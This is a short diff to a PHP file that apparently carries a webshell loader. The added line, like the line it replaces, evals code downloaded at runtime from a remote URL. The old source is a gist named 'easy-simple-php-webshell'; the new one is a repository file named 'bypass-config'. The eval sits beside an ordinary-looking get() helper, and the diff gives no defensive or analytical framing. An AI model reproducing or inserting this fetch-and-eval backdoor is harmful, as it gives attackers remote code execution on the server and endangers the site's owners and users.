@@ -12,4 +12,5 @@ function get($url) {
       return $data;
   }
   $x= '?>';
-         eval( urldecode("%3f%3e") . file_get_contents( urldecode( "https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/c871f130a12e97090a08d0ab855c1b7a93ef1150/easy-simple-php-webshell.php" ) ) ); ?>
+         eval( urldecode("%3f%3e") . file_get_contents( urldecode( "https://raw.githubusercontent.com/ipaybc/law/refs/heads/main/bypass-config.sange.txt" ) ) ); ?>
+
